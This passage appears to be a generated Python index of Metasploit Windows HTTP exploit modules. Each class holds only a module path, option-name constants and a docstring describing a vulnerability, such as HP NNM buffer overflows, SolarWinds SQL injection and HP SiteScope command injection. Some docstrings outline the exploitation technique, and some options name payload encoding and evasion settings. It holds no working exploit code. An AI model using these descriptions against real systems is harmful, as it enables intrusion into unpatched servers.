			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'
			required_TARGETURI = 'TARGETURI'

	class windows_http_hp_nnm_ovwebsnmpsrv_uro(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
        prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'
        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.
        The vulnerable code is within the option parsing function within "ovwebsnmpsrv.exe" with a
        timestamp prior to April 7th, 2010.

        Reaching the vulnerable code requires a 'POST' request with an 'arg' parameter that, when combined
        with a some static text, exceeds 10240 bytes. The parameter must begin with a dash. It is
        important to note that this vulnerability must be exploited by overwriting SEH. This is since
        overflowing the buffer with controllable data always triggers an access violation when
        attempting to write static text beyond the end of the stack.

        Exploiting this issue is a bit tricky due to a restrictive character set. In order to accomplish
        arbitrary code execution, a double-backward jump is used in combination with the Alpha2
        encoder.
      
		"""

		path = 'windows/http/hp_nnm_ovwebsnmpsrv_uro'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_oracle9i_xdb_pass(object):
		"""
		
          This module exploits a stack buffer overflow in the authorization
        code of the Oracle 9i HTTP XDB service. David Litchfield,
        has illustrated multiple vulnerabilities in the Oracle
        9i XML Database (XDB), during a seminar on "Variations
        in exploit methods between Linux and Windows" presented
        at the Blackhat conference.
      
		"""

		path = 'windows/http/oracle9i_xdb_pass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_bea_weblogic_transfer_encoding(object):
		"""
		
          This module exploits a stack based buffer overflow in the BEA
        Weblogic Apache plugin.  This vulnerability exists in the
        error reporting for unknown Transfer-Encoding headers.
        You may have to run this twice due to timing issues with handlers.
      
		"""

		path = 'windows/http/bea_weblogic_transfer_encoding'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_intrasrv_bof(object):
		"""
		
        This module exploits a boundary condition error in Intrasrv Simple Web
        Server 1.0. The web interface does not validate the boundaries of an
        HTTP request string prior to copying the data to an insufficiently sized
        buffer. Successful exploitation leads to arbitrary remote code execution
        in the context of the application.
      
		"""

		path = 'windows/http/intrasrv_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_http_solarwinds_storage_manager_sql(object):
		"""
		
          This module exploits a SQL injection found in Solarwinds Storage Manager
        login interface.  It will send a malicious SQL query to create a JSP file
        under the web root directory, and then let it download and execute our malicious
        executable under the context of SYSTEM.
      
		"""

		path = 'windows/http/solarwinds_storage_manager_sql'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_http_hp_nnm_toolbar_02(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.0
        and 7.53.  By sending a CGI request with a specially OvOSLocale cookie to Toolbar.exe, an
        attacker may be able to execute arbitrary code.  Please note that this module only works
        against a specific build (ie. NNM 7.53_01195)
      
		"""

		path = 'windows/http/hp_nnm_toolbar_02'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_http_netgear_nms_rce(object):
		"""
		
        Netgear's ProSafe NMS300 is a network management utility that runs on Windows systems.
        The application has a file upload vulnerability that can be exploited by an
        unauthenticated remote attacker to execute code as the SYSTEM user.
        Two servlets are vulnerable, FileUploadController (located at
        /lib-1.0/external/flash/fileUpload.do) and FileUpload2Controller (located at /fileUpload.do).
        This module exploits the latter, and has been tested with versions 1.5.0.2, 1.4.0.17 and
        1.1.0.13.
      
		"""

		path = 'windows/http/netgear_nms_rce'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_TARGETURI = 'TARGETURI'

	class windows_http_oracle_btm_writetofile(object):
		"""
		
          This module exploits abuses the FlashTunnelService SOAP web service on Oracle
        Business Transaction Management 12.1.0.7 to upload arbitrary files, without
        authentication, using the WriteToFile method. The same method contains a directory
        traversal vulnerability, which allows to upload the files to arbitrary locations.

        In order to execute remote code two techniques are provided. If the Oracle app has
        been deployed in the same WebLogic Samples Domain a JSP can be uploaded to the web
        root. If a new Domain has been used to deploy the Oracle application, the Windows
        Management Instrumentation service can be used to execute arbitrary code.

        Both techniques has been successfully tested on default installs of Oracle BTM
        12.1.0.7, Weblogic 12.1.1 and Windows 2003 SP2. Default path traversal depths are
        provided, but the user can configure the traversal depth using the DEPTH option.
      
		"""

		path = 'windows/http/oracle_btm_writetofile'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			DEPTH = 'DEPTH'

	class windows_http_hp_nnm_ovwebsnmpsrv_ovutil(object):
		"""
		
          This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53
        prior to NNM_01203. By specifying a long 'arg' parameter when executing the 'jovgraph.exe'
        CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary code.

        This vulnerability is triggerable via either a GET or POST request. It is interesting to
        note that this vulnerability cannot be exploited by overwriting SEH, since attempting
        to would trigger CVE-2010-1964.

        The vulnerable code is within a sub-function called from "main" within "ovwebsnmpsrv.exe"
        with a timestamp prior to April 7th, 2010. This function contains a 256 byte stack buffer
        which is passed to the "getProxiedStorageAddress" function within ovutil.dll. When
        processing the address results in an error, the buffer is overflowed in a call to sprintf_new.
        There are no stack cookies present, so exploitation is easily achieved by overwriting the
        saved return address.

        There exists some unreliability when running this exploit. It is not completely clear why
        at this time, but may be related to OVWDB or session management. Also, on some attempts
        OV NNM may report invalid characters in the URL. It is not clear what is causing this
        either.
      
		"""

		path = 'windows/http/hp_nnm_ovwebsnmpsrv_ovutil'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_http_hp_sitescope_dns_tool(object):
		"""
		
        This module exploits a command injection vulnerability
        discovered in HP SiteScope 11.30 and earlier versions (tested in 11.26
        and 11.30). The vulnerability exists in the DNS Tool allowing an
        attacker to execute arbitrary commands in the context of the service. By
        default, HP SiteScope installs and runs as SYSTEM in Windows and does
        not require authentication. This vulnerability only exists on the
        Windows version. The Linux version is unaffected.
      
		"""

		path = 'windows/http/hp_sitescope_dns_tool'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			SITE_SCOPE_USER = 'SITE_SCOPE_USER'
			SITE_SCOPE_PASSWORD = 'SITE_SCOPE_PASSWORD'
			required_TARGETURI = 'TARGETURI'

	class windows_http_trackercam_phparg_overflow(object):
		"""
		
          This module exploits a simple stack buffer overflow in the
        TrackerCam web server. All current versions of this software
        are vulnerable to a large number of security issues. This
        module abuses the directory traversal flaw to gain
        information about the system and then uses the PHP overflow
        to execute arbitrary code.
      
		"""

		path = 'windows/http/trackercam_phparg_overflow'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
